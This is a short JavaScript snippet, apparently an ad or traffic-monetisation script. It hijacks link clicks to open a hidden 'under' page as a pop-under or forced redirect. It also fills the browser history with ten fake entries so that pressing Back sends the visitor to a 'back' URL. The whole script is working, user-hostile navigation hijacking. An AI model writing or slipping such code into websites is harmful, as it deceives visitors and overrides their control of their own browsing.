if (typeof under !== "undefined" && under !== null) {
  if (typeof cta !== "undefined" && cta !== null) {
    document.addEventListener('click', function (event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A' && target.classList.contains(cta)) {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_self');
          openUnderPage(under);
          break;
        }
        target = target.parentNode;
      }
    });
  } else {
    document.addEventListener('click', function (event) {
      var target = event.target;
      while (target) {
        if (target.tagName === 'A') {
          const linkHref = target.href;
          event.preventDefault();
          window.open(linkHref, '_self');
          openUnderPage(under);
          break;
        }
        target = target.parentNode;
      }
    });
  }
}

function openUnderPage(under) {
  const newWindow = window.open(under, '_blank');
  if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
    window.top.location.href = under;
  }
}

if (typeof back !== "undefined" && back !== null) {
  !(function () {
    var t;
    try {
      const URL = window.location.href.split(/[#]/)[0];
      for (t = 0; t < 10; ++t) history.pushState({}, '', URL + '#');
      onpopstate = function (event) {
        event.state && openBackPage(back);
      };
    } catch (o) {
      console.log(o);
    }
  })();
}

function openBackPage(back) {
  const newWindow = window.open(back, '_blank');
  if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
    window.top.location.href = back;
  }
}
